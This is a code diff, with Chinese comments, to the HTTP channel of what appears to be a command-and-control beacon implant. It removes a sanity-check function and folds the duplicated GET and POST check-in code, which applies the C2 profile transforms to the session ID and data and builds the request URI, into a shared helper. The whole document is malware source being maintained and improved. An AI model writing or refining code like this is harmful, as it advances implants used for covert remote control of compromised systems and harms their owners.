@@ -7,8 +7,8 @@
 #include "beacon.h"
 #include "track_memory.h"
 #include "hostprof.h"
+#include "channel_http_common.h"
 
-static char http_current_host[256];
 
 
 #define PROXYB_MANUAL 0
@@ -101,19 +101,6 @@ void http_close() {
 	token_guard_stop();
 }
 
-void sanityCheck(char * buffer, int len) {
-	unsigned int size;
-	int pos = 0;
-	while (pos < len) {
-		memcpy((void *)&size, buffer + pos, 4);
-		size = ntohl(size);
-		if (pos + size > len) {
-			//dlog("Corrupt size: pos:%d size:%d len:%d\n", pos, size, len);
-		}
-		pos += size + 4;
-	}
-}
-
 /*
  * 移除和调整某些头部需要在连接过程的最后阶段进行。
  * 参见：https://stackoverflow.com/a/19418895
@@ -182,25 +169,12 @@ void http_post_maybe(char * hook) {
 	if (connect_h == NULL)
 		return;
 
-	/* 设置配置文件 */
-	profile_setup(&myprofile, http_post_len);
-
-	/* 将hook分配给URI */
-	_snprintf(myprofile.uri, 1024, "%s", hook);
-
 	/* 将ID转换为字符串，因为它是POST请求的参数 */
 	_snprintf(myid, 128, "%d", bigsession.myid);
 
-	/* 应用POST请求转换 */
-	apply(setting_ptr(SETTING_C2_POSTREQ), &myprofile, myid, strlen(myid), http_post_buffer, http_post_len);
-	hostprof_apply(http_current_host, &myprofile, 1);
-
-	if (strlen(myprofile.parameters) == 0) {
-		_snprintf(myuri, 1024, "%s", myprofile.uri);
-	}
-	else {
-		_snprintf(myuri, 1024, "%s%s", myprofile.uri, myprofile.parameters);
-	}
+	/* 设置配置文件、应用POST请求转换并拼出请求URI（公共组装，见 channel_http_common.h） */
+	http_assemble_request(&myprofile, myuri, hook, SETTING_C2_POSTREQ,
+	                      myid, (int)strlen(myid), http_post_buffer, http_post_len, 1);
 
 	token_guard_start();
 
@@ -281,23 +255,9 @@ int _http_get(char * hook, sessdata * meta, char * buffer, int max) {
 	if (connect_h == NULL)
 		return -1;
 
-	/* 设置配置文件 */
-	profile_setup(&myprofile, meta->length);
-
-	/* 将hook分配给URI */
-	_snprintf(myprofile.uri, 1024, "%s", hook);
-
-	/* 应用到配置文件 */
-	apply(setting_ptr(SETTING_C2_REQUEST), &myprofile, meta->data, meta->length, NULL, 0);
-	hostprof_apply(http_current_host, &myprofile, 0);
-
-	/* 请设置myuri */
-	if (strlen(myprofile.parameters) == 0) {
-		_snprintf(myuri, 1024, "%s", myprofile.uri);
-	}
-	else {
-		_snprintf(myuri, 1024, "%s%s", myprofile.uri, myprofile.parameters);
-	}
+	/* 设置配置文件、应用GET请求转换并拼出请求URI（公共组装，见 channel_http_common.h） */
+	http_assemble_request(&myprofile, myuri, hook, SETTING_C2_REQUEST,
+	                      meta->data, meta->length, NULL, 0, 0);
 
 	/* 打开请求 */
 	// dlog("channel._http_get - Opening and sending request for uri: %s \n", myuri);
